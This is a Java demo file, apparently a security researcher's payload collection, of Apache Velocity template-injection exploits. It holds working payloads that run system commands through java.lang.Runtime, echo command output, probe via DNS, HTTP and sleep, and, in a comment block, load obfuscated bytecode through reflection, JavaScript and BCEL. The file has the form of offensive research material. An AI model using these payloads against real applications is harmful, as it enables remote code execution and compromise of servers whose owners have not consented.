package com.ppp;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;

import java.io.StringWriter;

/**
 * @author Whoopsunix
 */
public class VelocityDemo {
    public static void main(String[] args) {
        // exec
        String exec1 = "#set($p='')$p.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('open -a Calculator.app')";
        String exec2 = "#set($p='')$p.class.forName('java.lang.Runtime').getRuntime().exec('open -a Calculator.app')";
        // 回显
        // https://github.com/woodpecker-appstore/jexpr-encoder-utils
        String exec3 = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('whoami')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end";
        String exec4 = "#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();')";

        // dns
        String dns = "#set($x='') $x.class.forName('java.net.InetAddress').getByName('test.com')";

        // http
        String http = "#set($x='') $x.class.forName('java.net.URL').declaredConstructors[2].newInstance('http://test.com').getContent()";

        // 1s
        String sleep = "#set($x='') $x.class.forName('java.lang.Thread').sleep(1000)";


        // loadClass todo

        /**
         * [+] 反射方案(该方案注射语句仅可执行一次，第二次需使用实例化语句【后附】)：==>
         * #set($x='-1rejpalkaihptukadjofpq4477jth2y9adxdj523l49dm7cwmb9owj7jzk9dmjllo7pua6cdyzg0kco2dpd10n4po1jvq08m9fd9eg7tf1zuxa5tupl2p1fagk1y8ymanwxm2jaq0ftg0hwywt816olbz124qfpl9cp3wksmr09fnx4gk9gghaslerw3wm854xqedf4d1qrexcdbfmo80scb3r6od63srz5v86ls55gibc79mvivqqsnh0jhixg00db3j1cnkjb25j8jfr9askci4ke36qp40ikge9lluop7cgucfri3i5kugxsp7nw66y133o6wy9b1uoqy9f7qkdxgmehydlgfq4okv2slddobttzm3kxyyyugwntfihfypigq1i2mvo44px2qi8j8m3jjk5rbkot9w5c28jmjfjqsgxjgduwo119y9ju3i5yw4cmq34y3rfzh5245qqfj92qm9o5vzuzquoxnxat4qm9t29g3i68inmxlcfvy3er65gql7gwexvki6m7gz0ykf4u85zkv7zjqcbsoc9sj2gi45t8bq73x1m3ualaw4ooibjasuschoz4vc18jgyk0ygwp1ia2e4bboov1cw0io28yd4h6ncpt5dzqnake9i8xuq4efovis8q1fkusni2dgren4hz2tboqjct52q96xpc8rcp76uanzs8eoiw8gxdsfp0yxmy5ij9894u94821su6eyp3deqysplsh66kqeyybpncqwl02gg0gck7k2hh5l4qlsh3j08xxog2godqtibnjzfcro5mbhs5ed1pksq3oz5m59jm96nlfidmzf78gscd7edfogcekmoidzpvjw1en7zf82fkzu6p9ng2xkb90ot8fz5foo6bt6hfdz98vwfy6oxp20iech2mqcoffw0mvy7jkqb50j3lxomwputang2lavxhynf3a4d425qbhei9s3utidj91pgl2svue0r7tmve7kexv4dg5ml1ineaowagcn6favzes66lzrduk9706f51a1ergnqmihbnkvyej') #set($ic=$x.class.forName("java.lang.Integer")) #set($cl=$x.class.forName("java.lang.ClassLoader")) #set($m1=$cl.getDeclaredMethod("defineClass", $x.bytes.class, $ic.getField("TYPE").get(1),$ic.getField("TYPE").get(1))) $m1.setAccessible(true) #set($cb=$x.class.forName("java.math.BigInteger").getConstructor($x.class, $ic.getField("TYPE").get(1)).newInstance($x,36).toByteArray()) $m1.invoke($x.class.forName("java.lang.Thread").currentThread().getContextClassLoader(), $cb, 0, 677).newInstance()
         *  <==
         * [+] 实例化语句：==>
         * #set($x='') $x.class.forName('jndi.Exec').newInstance()
         *  <==
         *
         * [+] JS-BASE64方案：==>
         * #set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(''jndi.Exec'').newInstance();}catch (e){var clsString = classLoader.loadClass(''java.lang.String'');var bytecodeBase64 = ''yv66vgAAADQALwoACwAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAIACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAIgcAIAEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACUV4ZWMuamF2YQwADAANBwAkDAAlACYBAARFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAZzdGF0aWMBAAlqbmRpL0V4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAoACwAAAAAAAgABAAwADQABAA4AAABkAAIAAgAAABoqtwABsgACEgO2AAS4AAUSBrYAB1enAARMsQABAAwAFQAYAAgAAgAPAAAAGgAGAAAADAAEAA0ADAAPABUAEgAYABAAGQATABAAAAAQAAL/ABgAAQcAEQABBwASAAAIABMADQABAA4AAAAlAAIAAAAAAAmyAAISCbYABLEAAAABAA8AAAAKAAIAAAAIAAgACgABABQAAAACABU='';var bytecode;try{var clsBase64 = classLoader.loadClass(''java.util.Base64'');var clsDecoder = classLoader.loadClass(''java.util.Base64$Decoder'');var decoder = clsBase64.getMethod(''getDecoder'').invoke(base64Clz);bytecode = clsDecoder.getMethod(''decode'', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass(''javax.xml.bind.DatatypeConverter'');bytecode = datatypeConverterClz.getMethod(''parseBase64Binary'', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(''sun.misc.BASE64Decoder'');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(''java.lang.ClassLoader'');var clsByteArray = (new java.lang.String(''a'').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(''defineClass'', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}')
         *  <==
         *
         * [+] JS-BigInteger方案：==>
         * #set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(''jndi.Exec'').newInstance();}catch (e){var clsString = classLoader.loadClass(''java.lang.String'');var bytecodeRaw = ''-1rejpalkaihptukadjofpq4477jth2y9adxdj523l49dm7cwmb9owj7jzk9dmjllo7pua6cdyzg0kco2dpd10n4po1jvq08m9fd9eg7tf1zuxa5tupl2p1fagk1y8ymanwxm2jaq0ftg0hwywt816olbz124qfpl9cp3wksmr09fnx4gk9gghaslerw3wm854xqedf4d1qrexcdbfmo80scb3r6od63srz5v86ls55gibc79mvivqqsnh0jhixg00db3j1cnkjb25j8jfr9askci4ke36qp40ikge9lluop7cgucfri3i5kugxsp7nw66y133o6wy9b1uoqy9f7qkdxgmehydlgfq4okv2slddobttzm3kxyyyugwntfihfypigq1i2mvo44px2qi8j8m3jjk5rbkot9w5c28jmjfjqsgxjgduwo119y9ju3i5yw4cmq34y3rfzh5245qqfj92qm9o5vzuzquoxnxat4qm9t29g3i68inmxlcfvy3er65gql7gwexvki6m7gz0ykf4u85zkv7zjqcbsoc9sj2gi45t8bq73x1m3ualaw4ooibjasuschoz4vc18jgyk0ygwp1ia2e4bboov1cw0io28yd4h6ncpt5dzqnake9i8xuq4efovis8q1fkusni2dgren4hz2tboqjct52q96xpc8rcp76uanzs8eoiw8gxdsfp0yxmy5ij9894u94821su6eyp3deqysplsh66kqeyybpncqwl02gg0gck7k2hh5l4qlsh3j08xxog2godqtibnjzfcro5mbhs5ed1pksq3oz5m59jm96nlfidmzf78gscd7edfogcekmoidzpvjw1en7zf82fkzu6p9ng2xkb90ot8fz5foo6bt6hfdz98vwfy6oxp20iech2mqcoffw0mvy7jkqb50j3lxomwputang2lavxhynf3a4d425qbhei9s3utidj91pgl2svue0r7tmve7kexv4dg5ml1ineaowagcn6favzes66lzrduk9706f51a1ergnqmihbnkvyej'';var bytecode = new java.math.BigInteger(bytecodeRaw,36).toByteArray();var clsClassLoader = classLoader.loadClass(''java.lang.ClassLoader'');var clsByteArray = (new java.lang.String(''a'').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(''defineClass'', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}')
         *  <==
         *
         * [+] JS-BCEL方案：==>
         * #set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('try {load(''nashorn:mozilla_compat.js'');}catch (e) {}importPackage(Packages.sun.misc); new com.sun.org.apache.bcel.internal.util.ClassLoader(new java.net.URLClassLoader(URLClassPath.pathToURLs(''''),java.lang.Thread.currentThread().getContextClassLoader())).loadClass(''$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMo$d3$40$Q$7d$9b$9a$acc$dc$af$E$97$b6$40I$a1$a5I$a1$f1$85$5b$w$$U9$Z$a8$I$w$e7$cdf$Vm$ea$d8$96$b3F$e5$Xq$$$87$82z$e8$P$e0G$B$b3$x$e8$87$c0$96g5o$de$bc7$9e$fd$f1$f3$e2$S$c0K$c4$B$eeb$a5$81$fbX$f5$b1$W$60$j$P$C$3c$c4$p$l$h$f6$7c$cc$d1$f6$b1$c9$f1$84$e3$vC$7d_g$da$bcb$98$ebt$8f$Z$bc$83$7c$a4$Y$W$T$9d$a9$b7$d5t$a8$ca$Pb$98$S2$3f0B$9e$bc$R$85$cb$5dw$9b$c1$df$97$e9$9f$fe$60$90W$a5T$af$b5e7$OO$95$ecM$c4$t$R$o$c4$3c$c7V$88m$3c$p$7d$5b$e0$d8$J$d1A$97c7$c4s$bc$60X$c9$L$95$b5$f7D$fb$40$a4$b2J$85$c9$cb$9e$u$8a$Q$7b$e81$b4$acP$9c$8al$i$l$9eJU$Y$9dg4$f9$cc$I$a3$r$99M$b2$91$8e$ad0$c3$d25$f5$ddp$a2$a4$b9$F$N$3e$cf$8c$9a$d2$bf$e6$V$V$a2$c4Ut$k$l$95$3a3$DS$w1$ed$ff$b5$bb$N3$f0$c2f$v$ZG$9d$e4$86$a4$nx$dc$b7$bb$5b$beF$dfW$99$d1SZD0V$e6$w$89$3a$dd$e4$l$O$Zz$ca$cd$be$f3$3f$dd$h$d0Q$99K5$9b$f5$b1$J$7b$c5$f6$a9$81$d9$fdR$5c$a0lDy$8d$ce$f5$ddo$60_Qk$ce$9d$c3$fb$8e$3b$cd$fa9$f8$c7$_$f0$923$c7$8f$b0$K$9f$98$8b$96$8b$3a$c5$Q$k$a9$84$84DhRu$JkhQ$E$7d$b5_$E0$8ee$h$9a$a0$ce$d6$95$e3$b6$f3$D$g$d6$adAng$940$t$i$b8$92Oo$40$c8$3d7l$f4$hi$f5$a2$P$a5$C$A$A'').newInstance();')
         *  <==
         */

        System.out.println(eval(exec1));


    }

    public static String eval(String poc){
        Velocity.init();
        VelocityContext ctx = new VelocityContext();
        StringWriter out = new StringWriter();
        Velocity.evaluate(ctx, out, "Whoopsunix", poc);
        return out.toString();
    }
}
